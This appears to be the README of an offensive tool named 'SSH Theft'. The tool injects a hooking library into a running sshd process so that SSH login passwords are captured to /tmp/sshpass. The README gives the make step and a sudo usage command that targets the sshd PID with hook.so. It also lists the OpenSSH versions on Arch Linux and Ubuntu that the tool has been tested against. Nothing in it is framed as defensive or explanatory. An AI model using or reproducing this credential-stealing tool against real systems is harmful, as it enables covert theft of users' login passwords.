# SSH Theft
Showcase:

![show](./assets/Peek.gif)

compile：

```Complile:
make
```

Usage:

```
$ sudo ./debug/main `ps -A |grep sshd|cut -d '?' -f1` fork fork `pwd`/debug/hook.so
...wait for logins.
$ cat /tmp/sshpass  
```

Notes:    

Hooking multiple library calls, pure code Injection, no monitor process.  
Currently have been tested on __archlinux openssh 8.2p1-3, archlinux openssh github master, ubuntu 18.04 openssh(ported with system), ubuntu 16.04 openssh(ported with system)__  .
